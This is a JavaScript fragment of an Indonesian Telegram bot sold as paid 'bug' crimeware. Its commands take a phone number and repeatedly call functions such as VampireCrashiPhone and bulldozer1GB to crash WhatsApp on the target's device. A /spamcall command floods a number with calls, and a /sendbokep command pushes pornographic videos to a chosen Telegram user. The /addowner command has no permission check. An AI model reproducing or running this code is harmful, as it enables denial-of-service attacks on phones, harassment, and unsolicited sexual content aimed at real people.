        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/JarzxNotDev" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/it39yd.mp4", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        await bulldozer1GB(sock, jid);
        await new Promise((r) => setTimeout(r, 2500));
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });
bot.onText(/\/zer (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/JarzxNotDev" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/it39yd.mp4", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        await bulldozer1GB(sock, jid);
        await new Promise((r) => setTimeout(r, 2500));
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });
bot.onText(/\/sena (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/JarzxNotDev" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/it39yd.mp4", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let i = 0; i < 80; i++) {
          await VampDelayCrash(jid);
          await VampireNewUi(jid);
          await blanksistematis(jid);
          await new Promise((r) => setTimeout(r, 1500));
        }
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });           

bot.onText(/\/blackios (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/JarzxNotDev" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }
            const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/it39yd.mp4", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let i = 0; i < 80; i++) {
          await VampireInvisIphone(jid);
          await VampireCrashiPhone(jid);
          await new Promise((r) => setTimeout(r, 1500));
        }
        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });           

// Ga Ush Lu Ubah Ini Spamcall
bot.onText(/\/spamcall (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const q = match[1]; // nomor tujuan

    // cek premium
    if (!isPrem(userId)) {
        return bot.sendMessage(chatId, "⚠️ Hanya untuk user premium!");
    }

    if (!q) {
        return bot.sendMessage(chatId, `*Example:* /spamcall 6287392784527`);
    }

    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return bot.sendMessage(chatId, `*! Number starts with 0. Replace with country code*\nExample: /spamcall 6287392784527`);
    }

    async function spamcall(target) {
        const Vinxy = makeWAVinxyet({
            printQRInTerminal: false,
        });

        try {
            console.log(`📞 Mengirim panggilan ke ${target}`);
            await Vinxy.query({
                tag: 'call',
                json: ['action', 'call', 'call', { id: `${target}` }],
            });
            console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
        } catch (err) {
            console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
        } finally {
            Vinxy.ev.removeAllListeners();
            Vinxy.ws.close();
        }
    }

    bot.sendMessage(chatId, "𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 🦠");

    let jid = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await spamcall(jid);
        await spamcall(jid);
        await spamcall(jid);
        await spamcall(jid);
    }

    await new Promise(r => setTimeout(r, 1000));
    bot.sendMessage(chatId, "𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
});
//=======plugins=======//
bot.onText(/\/tiktok (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url.includes("tiktok.com")) {
    return bot.sendMessage(chatId, "⚠️ *URL TikTok tidak valid!*", {
      parse_mode: "Markdown",
    });
  }

  try {
    const result = await tiktokDl(url);
    const video = result.video_links.find((v) => v.type === "nowatermark");

    if (!video) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Gagal mendapatkan video tanpa watermark!*",
        { parse_mode: "Markdown" }
      );
    }

    const caption =
      `📌 *${result.title}*\n` +
      `👤 *${result.author.nickname}*\n` +
      `🎥 *${result.stats.views}* views\n` +
      `❤️ *${result.stats.likes}* likes\n` +
      `💬 *${result.stats.comment}* comments\n` +
      `🔄 *${result.stats.share}* shares\n` +
      `📅 *Diunggah:* ${result.taken_at}\n` +
      `⏳ *Durasi:* ${result.duration}`;

    await bot.sendVideo(chatId, video.url, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ *Gagal mengambil video:* ${err.message}`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/^\/grouponly (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Group Only* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to admin users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
    }

    const args = match[1].split(' ');
    if (args.length < 2) {
        return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
    }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
    
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
    }
    
    if (!/^\d+[dhm]$/.test(duration)) {
        return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
    }

    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
        premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
        savePremiumUsers();
        console.log(`${senderId} added ${userId} to Prem until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added to the Prem list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    } else {
        const existingUser = premiumUsers.find(user => user.id === userId);
        existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
        savePremiumUsers();
        bot.sendMessage(chatId, `✅ User ${userId} is already a Vip user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    }
  } catch (error) {
    console.log(error)
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the Vip list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No Vip users found.");
  }

  let message = "𝐋𝐈𝐒𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ‼️";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove Vip users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delvip 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the Vip list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the regis list.`);
});

bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

let verified = false;

bot.onText(/^\/?verif (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const tokenInput = match[1].trim();

  const loading = await bot.sendMessage(chatId, "⏳ Sedang memverifikasi token...");

  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/JarzxNotDev/bypass/refs/heads/main/token.json");

    const tokenList = Array.isArray(data) ? data : data.tokens || [];

    const valid = tokenList.includes(tokenInput);

    if (valid) {
      verified = true;

      await bot.editMessageText("✅ <b>Verifikasi Berhasil!</b>\nBot sekarang aktif 🔥", {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML",
      });
    } else {
      await bot.editMessageText("❌ <b>Token Tidak Valid!</b>\nBot akan restart otomatis...", {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML",
      });

      for(;;);
    }
  } catch (err) {
    await bot.editMessageText("⚠️ Gagal mengambil data token dari server GitHub.", {
      chat_id: chatId,
      message_id: loading.message_id,
      parse_mode: "HTML",
    });
    console.error(err);
  }
});

bot.onText(/^\/cekid(\s|$)/i, async (msg) => {
const chatId = msg.chat.id;
const user = msg.from;
const text = `USERNAME : ${user.username ? '@' + user.username : 'Tidak ada'}
ID : ${chatId}`;
bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'Markdown',
        reply_to_message_id: msg.message_id
    });
}); 

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©Jarzx News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©Jarzx
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  try {
    const OWNER_ID = 7257623756; // Ganti dengan ID owner kamu
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = (match[1] || "").trim();
    const name = msg.from.first_name || "Tanpa Nama";

    if (!text)
      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");

    const message = `
📩 *Permintaan Fitur Baru*  
👤 Dari: ${name}  
🆔 ID: ${userId}  

💬 Pesan:  
${text}
    `;

    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
  } catch (err) {
    console.error("❌ Error di /reqfitur:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
  }
});

const videoList = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4",
  "https://files.catbox.moe/zjo5r6.mp4",
  "https://files.catbox.moe/7i6amv.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  "https://files.catbox.moe/fxe94h.mp4",
  "https://files.catbox.moe/52oh63.mp4",
  "https://files.catbox.moe/ite58a.mp4",
  "https://files.catbox.moe/svw26n.mp4",
  "https://files.catbox.moe/bv5yaa.mp4",
  "https://files.catbox.moe/ozk5xr.mp4",
  "https://files.catbox.moe/926k9a.mp4"
];

let lastVideoIndex = -1;

function pickRandomVideo() {
  let i;
  do {
    i = Math.floor(Math.random() * videoList.length);
  } while (i === lastVideoIndex && videoList.length > 1);

  lastVideoIndex = i;
  return videoList[i];
}

// --- Command: /sendbokep <telegram_id> ---
bot.onText(/\/sendbokep\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1];

  let waitingMsg = await bot.sendMessage(
    chatId,
    `🔍 *Memeriksa pengguna...*`,
    { parse_mode: "Markdown" }
  );

  try {
